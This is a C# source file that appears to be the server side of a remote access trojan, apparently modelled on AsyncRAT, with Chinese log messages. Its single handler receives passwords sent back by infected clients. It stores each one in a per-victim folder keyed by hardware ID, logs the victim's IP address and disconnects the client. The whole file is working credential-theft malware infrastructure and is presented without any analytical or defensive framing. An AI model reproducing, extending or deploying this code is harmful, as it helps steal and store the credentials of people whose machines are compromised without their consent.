using Server.Connection;
using Server.MessagePack;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    class HandlePassword
    {
        public void SavePassword(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string password = unpack_msgpack.ForcePathObject("Password").GetAsString();
                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("Hwid").AsString + "\\Password");
                if (!Directory.Exists(fullPath))
                    Directory.CreateDirectory(fullPath);
                File.WriteAllText(fullPath + $"\\Password_{DateTime.Now:MM-dd-yyyy HH;mm;ss}.txt", password);
                new HandleLogs().Addmsg($"客户端 {client.Ip} 密码保存成功，文件保存在 @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/Password", Color.Purple);
                client.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg($"密码保存错误: {ex.Message}", Color.Red);
            }
        }
    }
}
